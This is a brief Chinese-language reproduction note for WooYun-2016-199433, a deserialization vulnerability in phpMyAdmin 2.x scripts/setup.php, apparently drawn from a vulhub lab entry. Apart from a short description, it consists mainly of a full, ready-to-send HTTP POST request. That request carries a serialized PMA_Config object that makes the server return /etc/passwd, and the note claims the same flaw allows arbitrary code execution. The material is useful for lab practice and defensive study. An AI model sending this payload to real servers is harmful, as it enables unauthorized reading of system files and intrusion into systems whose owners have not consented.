（WooYun-2016-199433）Phpmyadmin scripts/setup.php 反序列化漏洞
===============================================================

一、漏洞简介
------------

phpmyadmin
2.x版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。

二、漏洞影响
------------

phpmyadmin 2.x

三、复现过程
------------

发送如下数据包，即可读取`/etc/passwd`：

    POST /scripts/setup.php HTTP/1.1
    Host: www.0-sec.org:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 80

    action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}

![1.png](./.resource/(WooYun-2016-199433)Phpmyadminscripts_setup.php反序列化漏洞/media/rId24.png)

参考链接
--------

> https://github.com/vulhub/vulhub/blob/master/phpmyadmin/WooYun-2016-199433/README.zh-cn.md
